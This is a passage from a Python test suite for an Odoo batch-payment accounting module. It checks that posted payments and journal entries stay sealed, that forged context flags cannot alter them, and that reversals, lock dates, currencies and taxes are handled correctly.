            ('reversed_entry_id', '=', original.id),
        ])
        self.assertEqual(len(reversal), 1)
        self.assertEqual(original.state, 'posted')
        self.assertTrue(original.eh_sealed)
        self.assertEqual(reversal.state, 'posted')
        self.assertTrue(reversal.eh_sealed)
        self.assertEqual(reversal.reversed_entry_id, original)
        self.assertTrue(batch.reversed_at)
        self.assertEqual(batch.reversed_by_id, self.env.user)
        for account in (original | reversal).line_ids.account_id:
            account_lines = (original | reversal).line_ids.filtered(
                lambda line: line.account_id == account,
            )
            self.assertAlmostEqual(sum(account_lines.mapped('balance')), 0.0)
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertAlmostEqual(source.amount_residual, 100.0, places=2)

        # Reopened source may enter a new reviewed payment run, while original
        # and counter-entry remain immutable posted evidence.
        retry = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-05-15',
        })
        self.Wizard.create({
            'batch_id': retry.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        self.assertEqual(retry.payment_ids.eh_source_move_ids, source)
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_reverse()
        with self.assertRaisesRegex(UserError, r'\S'):
            original._reverse_moves(cancel=True)

    def test_secure_entries_hashes_reviewed_source_and_batch_cash_move(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        cash_move = batch.payment_ids.move_id

        # Context strings from RPC cannot impersonate Base's object token.
        forged_context = {'eh_secure_hash_internal': True}
        with self.assertRaisesRegex(UserError, r'\S'):
            source.with_context(**forged_context).write({
                'inalterable_hash': 'forged-source-hash',
            })
        with self.assertRaisesRegex(UserError, r'\S'):
            cash_move.with_context(**forged_context).write({
                'inalterable_hash': 'forged-cash-hash',
            })
        with self.assertRaisesRegex(UserError, r'\S'):
            source.line_ids[:1].with_context(**forged_context).write({
                'name': 'forged secure-hash line mutation',
            })

        source._hash_moves(force_hash=True)
        cash_move._hash_moves(force_hash=True)
        source.invalidate_recordset(['inalterable_hash'])
        cash_move.invalidate_recordset(['inalterable_hash'])
        self.assertTrue(source.inalterable_hash)
        self.assertTrue(cash_move.inalterable_hash)

    def test_posted_payment_move_is_sealed_permanent_evidence(self):
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        move = batch.payment_ids.move_id

        self.assertTrue(move.eh_sealed)
        forged_move = move.with_user(SUPERUSER_ID).with_context(
            eh_core_aml_capability=True,
        )
        with self.assertRaisesRegex(UserError, r'\S'):
            forged_move.write({'ref': 'FORGED CORE AML MOVE'})
        with self.assertRaisesRegex(UserError, r'\S'):
            move.line_ids[:1].with_user(SUPERUSER_ID).with_context(
                eh_core_aml_capability=True,
            ).write({'name': 'FORGED CORE AML LINE'})
        if 'origin_payment_id' in move._fields:
            with self.assertRaisesRegex(UserError, r'\S'):
                move.write({'origin_payment_id': False})
        with self.assertRaisesRegex(UserError, r'\S'):
            move.line_ids[:1].write({'name': 'tampered evidence'})
        with self.assertRaisesRegex(UserError, r'\S'):
            move.button_draft()
        with self.assertRaisesRegex(UserError, r'\S'):
            move.unlink()

    def test_stuck_empty_posted_batch_resets_to_draft(self):
        """A posted batch with no posted payments (a previously stranded
        batch) can be returned to draft for retry."""
        batch = self._make_batch_with_one_payment()
        self._sql_update_batch_fields(batch, {'state': 'posted'})
        self.assertFalse(
            batch.payment_ids.filtered(lambda p: p.state in POSTED_STATES),
        )
        batch.action_set_to_draft()
        self.assertEqual(batch.state, 'draft')

    def test_incomplete_posted_cash_evidence_cannot_reset(self):
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        self._sql_update_batch_fields(batch, {'state': 'posted'})
        owner_field = (
            'origin_payment_id'
            if 'origin_payment_id' in self.env['account.move']._fields
            else 'payment_id'
        )
        if owner_field == 'origin_payment_id':
            cash_move = self.post_balanced_move([
                {'account': self.account_cash, 'debit': 1.0},
                {'account': self.account_revenue, 'credit': 1.0},
            ], date='2026-04-15')
            self.env.cr.execute(
                "UPDATE account_move SET origin_payment_id = %s "
                "WHERE id = %s",
                (member.id, cash_move.id),
            )
            cash_move.invalidate_recordset(['origin_payment_id'])
        else:
            cash_move = member.move_id
            self.env.cr.execute(
                "UPDATE account_move SET state = 'posted' WHERE id = %s",
                (cash_move.id,),
            )
            cash_move.invalidate_recordset(['state'])
            member.invalidate_recordset(['state'])

        try:
            batch.action_set_to_draft()
        except UserError:
            pass
        else:
            self.fail('posted cash evidence was cleared by reset')
        batch.invalidate_recordset(['state'])
        cash_move.invalidate_recordset(['state'])
        self.assertEqual(batch.state, 'posted')
        self.assertEqual(cash_move.state, 'posted')

    def test_raw_downgrade_cannot_erase_durable_posted_cash_evidence(self):
        if 'origin_payment_id' in self.env['account.move']._fields:
            self.skipTest('legacy delegated move is the raw-downgrade corridor')
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        cash_move = batch.payment_ids.move_id
        self.assertTrue(cash_move.posted_before)
        self.assertTrue(cash_move.eh_sealed)
        self.env.cr.execute(
            "UPDATE account_move SET state = 'draft' WHERE id = %s",
            (cash_move.id,),
        )
        cash_move.invalidate_recordset(['state'])
        batch.payment_ids.invalidate_recordset(['state'])

        try:
            batch.action_set_to_draft()
        except UserError:
            pass
        else:
            self.fail('raw-downgraded cash evidence lost its batch audit')
        batch.invalidate_recordset(['state', 'export_hash'])
        self.assertEqual(batch.state, 'posted')
        self.assertTrue(batch.export_hash)

    def test_posted_cash_evidence_blocks_cancel_and_cancelled_reset(self):
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        batch.action_confirm()
        owner_field = (
            'origin_payment_id'
            if 'origin_payment_id' in self.env['account.move']._fields
            else 'payment_id'
        )
        if owner_field == 'origin_payment_id':
            cash_move = self.post_balanced_move([
                {'account': self.account_cash, 'debit': 1.0},
                {'account': self.account_revenue, 'credit': 1.0},
            ], date='2026-04-15')
            self.env.cr.execute(
                "UPDATE account_move SET origin_payment_id = %s "
                "WHERE id = %s",
                (member.id, cash_move.id),
            )
            cash_move.invalidate_recordset(['origin_payment_id'])
        else:
            cash_move = member.move_id
            self.env.cr.execute(
                "UPDATE account_move SET state = 'posted' WHERE id = %s",
                (cash_move.id,),
            )
            cash_move.invalidate_recordset(['state'])
            member.invalidate_recordset(['state'])

        try:
            batch.action_cancel()
        except UserError:
            pass
        else:
            self.fail('batch with posted cash evidence was cancelled')
        batch.invalidate_recordset(['state'])
        self.assertEqual(batch.state, 'confirmed')

        self.env.cr.execute(
            "UPDATE eh_batch_payment SET state = 'cancelled' WHERE id = %s",
            (batch.id,),
        )
        batch.invalidate_recordset(['state'])
        try:
            batch.action_set_to_draft()
        except UserError:
            pass
        else:
            self.fail('cancelled batch cleared posted cash evidence')
        batch.invalidate_recordset(['state'])
        cash_move.invalidate_recordset(['state'])
        self.assertEqual(batch.state, 'cancelled')
        self.assertEqual(cash_move.state, 'posted')

    # ---- medium/low backlog production regressions ----

    def test_wizard_carries_source_bank_and_external_reference(self):
        bank_vals = {
            'partner_id': self.partner_a.id,
            'acc_number': 'AU-BATCH-SOURCE-001',
        }
        if 'allow_out_payment' in self.env['res.partner.bank']._fields:
            bank_vals['allow_out_payment'] = True
        recipient_bank = self.env['res.partner.bank'].create(bank_vals)
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        source.write({
            'ref': 'SUPPLIER-REF-0458',
            'payment_reference': 'PAYMENT-REF-0458',
            'partner_bank_id': recipient_bank.id,
        })
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': False,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()

        payment = batch.payment_ids
        memo_field = 'memo' if 'memo' in payment._fields else 'ref'
        self.assertEqual(payment.partner_bank_id, recipient_bank)
        self.assertEqual(payment[memo_field], 'PAYMENT-REF-0458')

    def test_confirmed_batch_has_non_posting_bank_file_preview(self):
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        approved_content, approved_filename = batch._eh_render_approved_export()

        action = batch.action_preview_csv()

        self.assertEqual(batch.state, 'confirmed')
        self.assertFalse(batch.export_file)
        self.assertEqual(action['type'], 'ir.actions.act_url')
        self.assertIn('/preview_export_file?', action['url'])
        self.assertEqual(
            base64.b64decode(batch.preview_export_file),
            approved_content,
        )
        self.assertEqual(batch.preview_export_filename, approved_filename)

    def test_partial_source_payment_posts_exact_reviewed_amount(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.payment_ids.write({'amount': 40.0})
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()

        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertEqual(source.payment_state, 'partial')
        self.assertAlmostEqual(source.amount_residual, 60.0)
        counterpart = batch.payment_ids.move_id.line_ids.filtered(
            lambda line: line.account_id
            == batch.payment_ids.destination_account_id,
        )
        self.assertTrue(counterpart)
        self.assertTrue(all(counterpart.mapped('reconciled')))

    def test_wizard_skip_and_prior_partial_chatter_paths(self):
        checker = self._make_checker_manager()
        bill = self._post_supplier_invoice(self.partner_a, 100.0)
        refund = self._post_supplier_refund(self.partner_a, 100.0)
        zero_batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.Wizard.create({
            'batch_id': zero_batch.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, (bill | refund).ids)],
        }).action_build()
        self.assertFalse(zero_batch.payment_ids)
        self.assertTrue(any(
            'partner(s) skipped' in (message.body or '')
            for message in zero_batch.message_ids
        ))

        standalone_batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.Wizard.create({
            'batch_id': standalone_batch.id,
            'aggregate_per_partner': False,
            'move_ids': [(6, 0, refund.ids)],
        }).action_build()
        self.assertFalse(standalone_batch.payment_ids)
        self.assertTrue(any(
            'credit note(s)/refund(s) skipped' in (message.body or '')
            for message in standalone_batch.message_ids
        ))

        partial_source = self._post_supplier_invoice(self.partner_b, 100.0)
        first = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': first.id,
            'move_ids': [(6, 0, partial_source.ids)],
        }).action_build()
        first.payment_ids.amount = 40.0
        first.action_confirm()
        first.with_user(checker).action_post()
        partial_source.invalidate_recordset([
            'amount_residual', 'payment_state',
        ])
        self.assertAlmostEqual(partial_source.amount_residual, 60.0)

        remainder = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-05-31',
        })
        self.Wizard.create({
            'batch_id': remainder.id,
            'move_ids': [(6, 0, partial_source.ids)],
        }).action_build()
        self.assertAlmostEqual(remainder.payment_ids.amount, 60.0)
        self.assertTrue(any(
            'already partially settled' in (message.body or '')
            for message in remainder.message_ids
        ))
        remainder.action_confirm()
        remainder.with_user(checker).action_post()
        partial_source.invalidate_recordset([
            'amount_residual', 'payment_state',
        ])
        self.assertEqual(partial_source.payment_state, 'paid')
        self.assertTrue(
            partial_source.currency_id.is_zero(
                partial_source.amount_residual,
            ),
        )

    def test_multi_source_aggregate_posts_and_reconciles(self):
        source_a = self._post_supplier_invoice(self.partner_a, 80.0)
        source_b = self._post_supplier_invoice(self.partner_a, 120.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, (source_a | source_b).ids)],
        }).action_build()
        self.assertEqual(len(batch.payment_ids), 1)
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        (source_a | source_b).invalidate_recordset([
            'amount_residual', 'payment_state',
        ])
        self.assertEqual(
            set((source_a | source_b).mapped('payment_state')),
            {'paid'},
        )
        self.assertTrue(all(
            source.currency_id.is_zero(source.amount_residual)
            for source in source_a | source_b
        ))

    def test_taxed_supplier_source_posts_through_batch(self):
        Tax = self.env['account.tax']
        tax_vals = {
            'name': 'Batch purchase tax 10%',
            'amount': 10.0,
            'amount_type': 'percent',
            'type_tax_use': 'purchase',
            'company_id': self.company.id,
        }
        if 'country_id' in Tax._fields:
            tax_vals['country_id'] = self._ensure_tax_country().id
        tax = Tax.create(tax_vals)
        source = self.env['account.move'].create({
            'move_type': 'in_invoice',
            'partner_id': self.partner_a.id,
            'invoice_date': '2026-04-15',
            'invoice_line_ids': [(0, 0, {
                'name': 'Taxed batch source',
                'quantity': 1,
                'price_unit': 100.0,
                'account_id': self.account_expense.id,
                'tax_ids': [(6, 0, tax.ids)],
            })],
        })
        source.action_post()
        self.assertGreater(source.amount_tax, 0.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertEqual(source.payment_state, 'paid')
        self.assertTrue(source.currency_id.is_zero(source.amount_residual))

    def test_header_currency_falls_back_to_company_currency(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.assertEqual(
            batch.currency_id,
            self.bank_journal.currency_id or self.company.currency_id,
        )
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'currency_id': self.company.currency_id.id,
            'amount': 12.34,
            'date': '2026-04-15',
        })
        self.assertEqual(batch.currency_id, self.company.currency_id)
        self.assertAlmostEqual(batch.total_amount, 12.34)

    def test_real_rate_mixed_currency_batch_builds_posts_and_totals(self):
        self.assertFalse(
            self.bank_journal.currency_id,
            "the mixed-currency corridor requires a company-currency journal",
        )
        foreign = self.env['res.currency'].create({
            'name': 'BFX',
            'symbol': 'BFX',
            'rounding': 0.01,
            'active': True,
        })
        self.env['res.currency.rate'].create({
            'currency_id': foreign.id,
            'company_id': self.company.id,
            'name': '2026-04-01',
            'rate': 2.0,
        })
        local_source = self._post_supplier_invoice(self.partner_a, 50.0)
        foreign_source = self.env['account.move'].create({
            'move_type': 'in_invoice',
            'partner_id': self.partner_a.id,
            'currency_id': foreign.id,
            'invoice_date': '2026-04-15',
            'date': '2026-04-15',
            'invoice_line_ids': [(0, 0, {
                'name': 'Real-rate foreign batch source',
                'quantity': 1,
                'price_unit': 200.0,
                'account_id': self.account_expense.id,
            })],
        })
        foreign_source.action_post()
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, (local_source | foreign_source).ids)],
        }).action_build()

        self.assertEqual(len(batch.payment_ids), 2)
        self.assertEqual(
            set(batch.payment_ids.mapped('currency_id').ids),
            {self.company.currency_id.id, foreign.id},
        )
        self.assertTrue(batch.is_mixed_currency)
        expected = 50.0 + foreign._convert(
            200.0,
            self.company.currency_id,
            self.company,
            fields.Date.from_string('2026-04-30'),
        )
        self.assertAlmostEqual(batch.total_amount, expected)
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        (local_source | foreign_source).invalidate_recordset([
            'amount_residual', 'payment_state',
        ])
        self.assertEqual(
            set((local_source | foreign_source).mapped('payment_state')),
            {'paid'},
        )

    def test_company_direction_and_business_date_scope_batch_sequence(self):
        outbound = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2024-12-31',
        })
        inbound = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'inbound',
            'payment_date': '2023-01-02',
        })
        self.assertTrue(outbound.name.startswith('BATCH-OUT/2024/'))
        self.assertTrue(inbound.name.startswith('BATCH-IN/2023/'))
        sequences = self.env['ir.sequence'].search([
            ('code', 'in', (
                'eh.batch.payment.inbound',
                'eh.batch.payment.outbound',
            )),
            ('company_id', '=', self.company.id),
        ])
        self.assertEqual(len(sequences), 2)

    def test_owner_advisory_locks_are_bounded_by_stripes(self):
        real_execute = self.env.cr.execute
        keys = []

        def _record_execute(query, params=None, *args, **kwargs):
            if params and 'owner.v1:' in repr(params):
                keys.append(params[0])
            return real_execute(query, params, *args, **kwargs)

        with patch.object(self.env.cr, 'execute', _record_execute):
            self.Batch._eh_advisory_move_owner_lock(range(1, 1001))
            self.Batch._eh_advisory_payment_owner_lock(range(1, 1001))

        self.assertLessEqual(len(keys), 128)
        self.assertEqual(len(keys), len(set(keys)))

    def test_move_guard_savepoints_are_scoped_to_evidence_mutations(self):
        Move = self.env['account.move']
        self.assertFalse(Move._eh_create_needs_guard_savepoint([{
            'move_type': 'entry',
            'line_ids': [(0, 0, {
                'name': 'new line',
                'account_id': self.account_expense.id,
            })],
        }]))
        self.assertFalse(Move._eh_write_needs_guard_savepoint({
            'narration': 'ordinary descriptive edit',
        }))
        self.assertTrue(Move._eh_write_needs_guard_savepoint({
            'ref': 'financial evidence edit',
        }))

    def test_posted_source_metadata_can_be_corrected_but_confirmed_cannot(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        with self.assertRaisesRegex(UserError, 'source are frozen'):
            source.write({'payment_reference': 'BLOCKED-WHILE-CONFIRMED'})
        batch.with_user(self._make_checker_manager()).action_post()
        export_before = batch.export_file

        source.write({
            'ref': 'CORRECTED-VENDOR-REFERENCE',
            'payment_reference': 'CORRECTED-PAYMENT-REFERENCE',
            'invoice_date_due': '2026-05-31',
            'invoice_date': '2026-04-16',
        })

        self.assertEqual(source.ref, 'CORRECTED-VENDOR-REFERENCE')
        self.assertEqual(source.payment_reference, 'CORRECTED-PAYMENT-REFERENCE')
        self.assertEqual(
            source.invoice_date_due,
            fields.Date.from_string('2026-05-31'),
        )
        self.assertEqual(batch.export_file, export_before)

        # Base's Odoo 16/17 dynamic-line corridor is an object-identity
        # capability. A context value supplied by RPC must not impersonate it
        # and mutate the reviewed source journal items.
        forged_source = source.with_context(eh_account_engine_internal=True)
        self.assertFalse(forged_source._eh_has_account_engine_capability())
        source_line = source.line_ids[:1]
        source_line_name = source_line.name
        with self.assertRaisesRegex(UserError, r'\S'):
            source_line.with_context(
                eh_account_engine_internal=True,
            ).write({'name': 'FORGED ACCOUNT ENGINE LINE'})
        self.assertEqual(source_line.name, source_line_name)

    def test_integrity_branch_messages_identify_exact_rejection(self):
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        with self.assertRaisesRegex(UserError, 'greater than zero'):
            member.write({'amount': 0.0})
        with self.assertRaisesRegex(UserError, 'precision-rounded'):
            # Monetary fields round ordinary ORM input before model
            # validation. Exercise the defensive corruption branch exactly.
            with self.env.cr.savepoint():
                self.env.cr.execute(
                    "UPDATE account_payment SET amount = %s WHERE id = %s",
                    (100.001, member.id),
                )
                member.invalidate_recordset(['amount'])
                batch._eh_validate_integrity()
        member.invalidate_recordset(['amount'])
        with self.assertRaisesRegex(UserError, 'must have a partner'):
            member.write({'partner_id': False})
        if 'is_internal_transfer' in member._fields:
            with self.assertRaisesRegex(UserError, 'Internal-transfer'):
                member.write({'is_internal_transfer': True})

        inbound_method = self.bank_journal.inbound_payment_method_line_ids[:1]
        if inbound_method:
            with self.assertRaisesRegex(UserError, 'payment method must belong'):
                batch.write({'payment_method_line_id': inbound_method.id})
            with self.assertRaisesRegex(UserError, 'method must match'):
                with self.env.cr.savepoint():
                    self.env.cr.execute(
                        "UPDATE account_payment "
                        "SET payment_method_line_id = %s WHERE id = %s",
                        (inbound_method.id, member.id),
                    )
                    member.invalidate_recordset(['payment_method_line_id'])
                    batch._eh_validate_integrity()
            member.invalidate_recordset(['payment_method_line_id'])

    def test_subcent_aggregate_is_skipped_before_zero_payment_create(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        wizard = self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, source.ids)],
        })
        WizardModel = type(wizard)
        with patch.object(
            WizardModel,
            '_eh_directional_residual',
            return_value=0.004,
        ):
            wizard.action_build()
        self.assertFalse(batch.payment_ids)
        self.assertTrue(any(
            'partner(s) skipped' in (message.body or '')
            for message in batch.message_ids
        ))

    def test_batch_views_expose_only_valid_server_workflows(self):
        batch_arch = self.env.ref(
            'eh_account_batch_payment.view_eh_batch_payment_form',
        ).arch_db
        payment_arch = self.env.ref(
            'eh_account_batch_payment.view_account_payment_form_batch',
        ).arch_db
        self.assertIn('posted_count', batch_arch)
        self.assertIn('action_set_to_draft', batch_arch)
        self.assertNotIn('name="is_reconciled" widget="boolean_toggle"', batch_arch)
        self.assertIn('name="is_reconciled"', batch_arch)
        self.assertIn('name="eh_batch_payment_id"', payment_arch)
        self.assertIn('state', payment_arch)
        self.assertIn('no_create', payment_arch)

    def test_plain_eh_user_can_prepare_a_draft_batch(self):
        Batch = self.Batch.with_user(self.accountant_user)
        batch = Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        payment = self.env['account.payment'].with_user(
            self.accountant_user,
        ).create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 25.0,
            'date': '2026-04-15',
        })
        self.assertEqual(payment.eh_batch_payment_id, batch)
        self.assertEqual(batch.state, 'draft')
        with self.assertRaisesRegex(UserError, 'EH Accounting Manager'):
            batch.action_confirm()

    def test_child_company_batch_uses_scoped_sequence_as_real_actor(self):
        branch = self._create_accounting_branch({
            'name': 'Batch Payment Branch',
            'parent_id': self.company.id,
        })
        branch_env = self.env['res.company'].with_company(branch).with_context(
            allowed_company_ids=[self.company.id, branch.id],
        ).env
        journal = self._ensure_journal(
            branch_env,
            branch,
            'bank',
            'BBNK',
            'Branch Batch Bank',
        )
        self.accountant_user.sudo().write({
            'company_ids': [Command.link(branch.id)],
        })
        actor_batch = self.Batch.with_user(
            self.accountant_user,
        ).with_company(branch).with_context(
            allowed_company_ids=[self.company.id, branch.id],
        ).create({
            'journal_id': journal.id,
            'company_id': branch.id,
            'batch_type': 'outbound',
            'payment_date': '2025-06-30',
        })
        self.assertEqual(actor_batch.company_id, branch)
        self.assertTrue(actor_batch.name.startswith('BATCH-OUT/2025/'))
        sequence = self.env['ir.sequence'].search([
            ('code', '=', 'eh.batch.payment.outbound'),
            ('company_id', '=', branch.id),
        ])
        self.assertEqual(len(sequence), 1)

    def test_modern_payment_corridor_proves_equivalent_owner_seams(self):
        Move = self.env['account.move']
        if 'origin_payment_id' not in Move._fields:
            return
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        self.assertFalse(member.move_id)
        real_execute = self.env.cr.execute
        module_wide_locks = []

        def _record_execute(query, params=None, *args, **kwargs):
            if params and 'integrity.v1' in repr(params):
                module_wide_locks.append(params)
            return real_execute(query, params, *args, **kwargs)

        unbatched = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 20.0,
            'date': '2026-04-15',
        })
        with patch.object(self.env.cr, 'execute', _record_execute):
            unbatched.write({'amount': 21.0})
        self.assertFalse(module_wide_locks)
        self.assertTrue(member._eh_expected_outstanding_account())
        with self.assertRaisesRegex(UserError, 'batch Post workflow'):
            member.action_post()
        batch.action_confirm()
        with self.assertRaisesRegex(UserError, 'frozen after batch confirmation'):
            member.write({'amount': 99.0})

    def test_cash_basis_tax_source_posts_and_creates_caba_entry(self):
        Tax = self.env['account.tax']
        if 'tax_exigibility' not in Tax._fields:
            return
        transition = self._ensure_account(
            self.env,
            '5198',
            'Batch CABA Transition',
            'expense',
        )
        transition.reconcile = True
        base_account = self._ensure_account(
            self.env,
            '5197',
            'Batch CABA Base',
            'expense',
        )
        company_vals = {}
        if 'tax_exigibility' in self.company._fields:
            company_vals['tax_exigibility'] = True
        if 'account_cash_basis_base_account_id' in self.company._fields:
            company_vals['account_cash_basis_base_account_id'] = base_account.id
        if 'tax_cash_basis_journal_id' in self.company._fields:
            company_vals['tax_cash_basis_journal_id'] = self.journal_misc.id
        if company_vals:
            self.company.write(company_vals)
        tax_vals = {
            'name': 'Batch cash-basis purchase tax 10%',
            'amount': 10.0,
            'amount_type': 'percent',
            'type_tax_use': 'purchase',
            'company_id': self.company.id,
            'tax_exigibility': 'on_payment',
            'cash_basis_transition_account_id': transition.id,
        }
        if 'country_id' in Tax._fields:
            tax_vals['country_id'] = self._ensure_tax_country().id
        tax = Tax.create(tax_vals)
        source = self.env['account.move'].create({
            'move_type': 'in_invoice',
            'partner_id': self.partner_a.id,
            'invoice_date': '2026-04-15',
            'invoice_line_ids': [(0, 0, {
                'name': 'Cash-basis taxed batch source',
                'quantity': 1,
                'price_unit': 100.0,
                'account_id': self.account_expense.id,
                'tax_ids': [(6, 0, tax.ids)],
            })],
        })
        source.action_post()
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        caba_move = self.env['account.move'].search([
            ('tax_cash_basis_origin_move_id', '=', source.id),
        ])
        self.assertTrue(caba_move)
        self.assertEqual(set(caba_move.mapped('state')), {'posted'})
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertTrue(source.currency_id.is_zero(source.amount_residual))

    # ---- fiscal lock date ----

    def test_post_blocked_into_locked_period(self):
        """A confirmed batch dated on or before the company fiscal lock
        date must be refused with a clear UserError before any payment is
        posted. Without the guard, the batch would try to book journal
        entries into a closed period."""
        if 'fiscalyear_lock_date' not in self.env['res.company']._fields:
            self.skipTest("fiscalyear_lock_date not present on this build")
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-01-31',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-01-31',
        })
        batch.action_confirm()
        # Lock the period the batch is dated into.
        self._lock_company_period('2026-03-31')
        checker = self._make_checker_manager()
        with self.assertRaisesRegex(UserError, 'Cannot post this batch'):
            batch.with_user(checker).action_post()
        # The batch must not have advanced to posted.
        self.assertEqual(batch.state, 'confirmed')

    def test_post_allowed_after_lock_date(self):
        """A batch dated strictly after the lock date still posts."""
        if 'fiscalyear_lock_date' not in self.env['res.company']._fields:
            self.skipTest("fiscalyear_lock_date not present on this build")
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-06-30',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-06-30',
        })
        batch.action_confirm()
        self._lock_company_period('2026-03-31')
        checker = self._make_checker_manager()
        batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'posted')

    def test_reset_blocked_for_confirmed_batch(self):
        """The reset relaxation is narrow: a confirmed batch still cannot
        return to draft."""
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        self.assertEqual(batch.state, 'confirmed')
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_set_to_draft()


@tagged('eh_account_batch_payment', 'integration', 'post_install', '-at_install')
class TestBatchPaymentConcurrency(TransactionCase):
    """Real independent-connection proof of the batch critical section."""

    _LOCK_KEY = 'eh_account_batch_payment.integrity.v1'

    def _connect(self):
        return odoo.sql_db.db_connect(self.env.cr.dbname).cursor()

    def test_batch_and_member_locks_exclude_second_transaction(self):
        seed_cr = self._connect()
        batch_id = payment_id = payment_move_id = partner_id = False
        payment_move_line_ids = []
        company_id = journal_id = outstanding_id = payable_id = False
        created_journal = created_outstanding = created_payable = False
        company_restore = {}
        outstanding_reconcile_restore = True
        try:
            seed_env = api.Environment(seed_cr, SUPERUSER_ID, {})
            company = seed_env.company
            Account = seed_env['account.account']
            account_company_field = (
                'company_ids' if 'company_ids' in Account._fields
                else 'company_id'
            )
            existing_outstanding = Account.search([
                ('code', '=', 'C098'),
                (account_company_field, 'in', company.ids),
            ], limit=1)
            outstanding = EhAccountIntegrationTestCase._ensure_account(
